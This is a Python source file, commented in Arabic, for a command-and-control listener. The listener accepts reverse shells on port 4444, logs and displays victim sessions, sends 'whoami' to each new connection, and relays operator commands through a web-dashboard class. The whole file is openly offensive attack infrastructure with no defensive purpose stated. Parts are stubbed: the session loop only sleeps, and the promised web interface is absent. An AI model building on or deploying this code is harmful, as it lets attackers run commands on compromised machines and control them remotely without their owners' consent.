#!/usr/bin/env python3
"""
C2 Listener - مركز القيادة والتحكم
يستقبل Reverse Shells ويدير الجلسات
"""

import socket
import threading
import json
import time
import os
import sys
from datetime import datetime

class C2Listener:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.server = None
        self.sessions = {}
        self.running = False
        
        # إعداد سجلات النظام
        self.logs_dir = "c2_listener/logs"
        os.makedirs(self.logs_dir, exist_ok=True)
        
        print(f"[C2] تم تهيئة Listener على {host}:{port}")
    
    def start(self):
        """بدء استقبال الاتصالات"""
        self.running = True
        
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server.bind((self.host, self.port))
            self.server.listen(5)
            
            print(f"[C2] جاهز لاستقبال الاتصالات على {self.host}:{self.port}")
            self._log_event("system", "Listener started")
            
            # خيط للاستماع
            listener_thread = threading.Thread(target=self._accept_connections)
            listener_thread.daemon = True
            listener_thread.start()
            
            # خيط لعرض الجلسات
            display_thread = threading.Thread(target=self._display_sessions)
            display_thread.daemon = True
            display_thread.start()
            
            # انتظار حتى إيقاف النظام
            while self.running:
                time.sleep(1)
                
        except Exception as e:
            print(f"[C2] خطأ: {e}")
            self._log_event("error", f"Listener error: {e}")
        finally:
            self.stop()
    
    def _accept_connections(self):
        """قبول الاتصالات الواردة"""
        while self.running:
            try:
                client_socket, client_address = self.server.accept()
                
                # إنشاء جلسة جديدة
                session_id = self._generate_session_id()
                session = {
                    'id': session_id,
                    'socket': client_socket,
                    'address': client_address,
                    'connected_at': datetime.now(),
                    'last_seen': datetime.now(),
                    'device_info': {},
                    'status': 'connected'
                }
                
                self.sessions[session_id] = session
                
                print(f"[C2] جلسة جديدة [{session_id}] من {client_address}")
                self._log_event("connection", f"New session {session_id} from {client_address}")
                
                # بدء معالجة الجلسة
                session_thread = threading.Thread(
                    target=self._handle_session,
                    args=(session_id,)
                )
                session_thread.daemon = True
                session_thread.start()
                
            except Exception as e:
                if self.running:
                    print(f"[C2] خطأ في قبول الاتصال: {e}")
    
    def _handle_session(self, session_id):
        """معالجة جلسة اتصال"""
        session = self.sessions.get(session_id)
        if not session:
            return
        
        client_socket = session['socket']
        
        try:
            # إرسال رسالة ترحيب
            welcome_msg = "[+] Connected to C2 Server\n"
            welcome_msg += "[+] Type 'help' for available commands\n"
            client_socket.send(welcome_msg.encode())
            
            # الحصول على معلومات الجهاز
            client_socket.send(b"whoami\n")
            time.sleep(1)
            
            # حلقة استقبال الأوامر
            while session['status'] == 'connected':
                try:
                    # إرسال رمز الأمر
                    client_socket.send(b"\ncmd> ")
                    
                    # قراءة الأمر من المستخدم (في الواقع من واجهة الويب)
                    # هنا مجرد محاكاة
                    time.sleep(5)
                    
                    # تحديث وقت آخر رؤية
                    session['last_seen'] = datetime.now()
                    
                except Exception as e:
                    print(f"[C2] خطأ في الجلسة {session_id}: {e}")
                    break
                    
        except Exception as e:
            print(f"[C2] فقدت الاتصال بالجلسة {session_id}: {e}")
        finally:
            self._close_session(session_id)
    
    def _close_session(self, session_id):
        """إغلاق جلسة"""
        session = self.sessions.get(session_id)
        if session:
            try:
                session['socket'].close()
            except:
                pass
            
            session['status'] = 'disconnected'
            session['disconnected_at'] = datetime.now()
            
            print(f"[C2] الجلسة {session_id} تم إغلاقها")
            self._log_event("disconnection", f"Session {session_id} closed")
    
    def send_command(self, session_id, command):
        """إرسال أمر لجلسة محددة"""
        session = self.sessions.get(session_id)
        if not session or session['status'] != 'connected':
            return "الجلسة غير نشطة"
        
        try:
            client_socket = session['socket']
            
            # إرسال الأمر
            client_socket.send(f"{command}\n".encode())
            
            # استقبال النتيجة (بسيط - في الواقع يحتاج لتنفيذ أفضل)
            time.sleep(1)
            result = self._receive_data(client_socket, timeout=3)
            
            self._log_event("command", f"Session {session_id}: {command}")
            
            return result or "تم تنفيذ الأمر"
            
        except Exception as e:
            return f"خطأ: {e}"
    
    def _receive_data(self, socket, timeout=5):
        """استقبال البيانات من السوكيت"""
        socket.settimeout(timeout)
        try:
            data = b""
            while True:
                chunk = socket.recv(4096)
                if not chunk:
                    break
                data += chunk
                if len(chunk) < 4096:
                    break
            return data.decode('utf-8', errors='ignore')
        except:
            return ""
    
    def _generate_session_id(self):
        """إنشاء معرف فريد للجلسة"""
        import hashlib
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S%f")
        random_str = os.urandom(8).hex()
        session_hash = hashlib.md5(f"{timestamp}{random_str}".encode()).hexdigest()[:8]
        return f"SESS-{session_hash}"
    
    def _display_sessions(self):
        """عرض الجلسات النشطة دورياً"""
        while self.running:
            os.system('cls' if os.name == 'nt' else 'clear')
            
            print("\n" + "="*60)
            print("          C2 LISTENER - ACTIVE SESSIONS")
            print("="*60)
            
            active_count = 0
            for session_id, session in self.sessions.items():
                if session['status'] == 'connected':
                    active_count += 1
                    addr = session['address'][0]
                    connected_time = session['connected_at'].strftime("%H:%M:%S")
                    last_seen = session['last_seen'].strftime("%H:%M:%S")
                    
                    print(f"\n[{session_id}]")
                    print(f"  IP: {addr}")
                    print(f"  Connected: {connected_time}")
                    print(f"  Last seen: {last_seen}")
                    print(f"  Status: {session['status']}")
            
            print(f"\n{'='*60}")
            print(f"Total sessions: {len(self.sessions)} | Active: {active_count}")
            print("="*60)
            print("\nPress Ctrl+C to stop\n")
            
            time.sleep(3)
    
    def _log_event(self, event_type, message):
        """تسجيل أحداث النظام"""
        log_file = os.path.join(self.logs_dir, "c2_events.log")
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        log_entry = f"[{timestamp}] [{event_type.upper()}] {message}\n"
        
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(log_entry)
    
    def get_sessions_info(self):
        """الحصول على معلومات الجلسات للتطبيق"""
        sessions_info = []
        for session_id, session in self.sessions.items():
            sessions_info.append({
                'id': session_id,
                'ip': session['address'][0],
                'port': session['address'][1],
                'status': session['status'],
                'connected_at': session['connected_at'].isoformat() if 'connected_at' in session else None,
                'last_seen': session['last_seen'].isoformat() if 'last_seen' in session else None
            })
        
        return sessions_info
    
    def stop(self):
        """إيقاف الـ Listener"""
        self.running = False
        
        if self.server:
            try:
                self.server.close()
            except:
                pass
        
        # إغلاق جميع الجلسات
        for session_id in list(self.sessions.keys()):
            self._close_session(session_id)
        
        print("[C2] تم إيقاف Listener")
        self._log_event("system", "Listener stopped")

# واجهة ويب للـ C2
class C2WebInterface:
    def __init__(self, c2_listener):
        self.c2 = c2_listener
        
    def get_dashboard_data(self):
        """الحصول على بيانات لوحة التحكم"""
        sessions = self.c2.get_sessions_info()
        
        stats = {
            'total_sessions': len(sessions),
            'active_sessions': len([s for s in sessions if s['status'] == 'connected']),
            'inactive_sessions': len([s for s in sessions if s['status'] == 'disconnected'])
        }
        
        return {
            'stats': stats,
            'sessions': sessions,
            'system_status': 'running' if self.c2.running else 'stopped'
        }
    
    def execute_command(self, session_id, command):
        """تنفيذ أمر عبر الواجهة"""
        if session_id not in self.c2.sessions:
            return {'success': False, 'error': 'الجلسة غير موجودة'}
        
        result = self.c2.send_command(session_id, command)
        return {'success': True, 'result': result}

# تشغيل الـ C2 Listener
if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════════════╗
    ║       C2 LISTENER - Command & Control        ║
    ║           Reverse Shell Management           ║
    ╚══════════════════════════════════════════════╝
    """)
    
    listener = C2Listener(port=4444)
    
    try:
        # بدء الـ Listener في خيط منفصل
        import threading
        listener_thread = threading.Thread(target=listener.start)
        listener_thread.daemon = True
        listener_thread.start()
        
        # الانتظار لمعاينة التشغيل
        print("\n[*] C2 Listener يعمل في الخلفية")
        print("[*] افتح المتصفح على http://localhost:8080 للتحكم")
        print("[*] اضغط Ctrl+C للإيقاف\n")
        
        # انتظار حتى إيقاف البرنامج
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n[!] إيقاف C2 Listener...")
        listener.stop()
        print("[+] تم الإيقاف بنجاح")